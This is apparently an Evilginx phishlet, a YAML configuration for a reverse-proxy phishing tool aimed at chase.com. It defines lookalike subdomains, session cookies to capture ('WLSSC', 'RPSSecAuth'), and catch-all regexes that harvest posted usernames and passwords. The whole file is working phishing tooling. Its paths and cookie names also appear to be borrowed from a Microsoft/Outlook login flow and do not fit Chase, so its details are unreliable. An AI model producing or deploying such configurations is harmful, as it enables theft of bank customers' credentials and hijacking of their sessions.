author: '@mrgretzky'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'wwww', orig_sub: 'secure07c', domain: 'chase.com', session: true, is_landing: true}
  - {phish_sub: 'login', orig_sub: 'secure07c', domain: 'chase.com', session: true, is_landing: false}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'chase.com', session: false, is_landing: false}
sub_filters:
  - {triggers_on: 'secure07c.chase.com', orig_sub: 'secure07c', domain: 'chase.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'secure07c.chase.com', orig_sub: 'secure07c', domain: 'chase.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
auth_tokens:
  - domain: '.secure07c.chase.com'
    keys: ['WLSSC','RPSSecAuth']
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'secure07.chase.com'
  path: '/owa/?nlp=1'
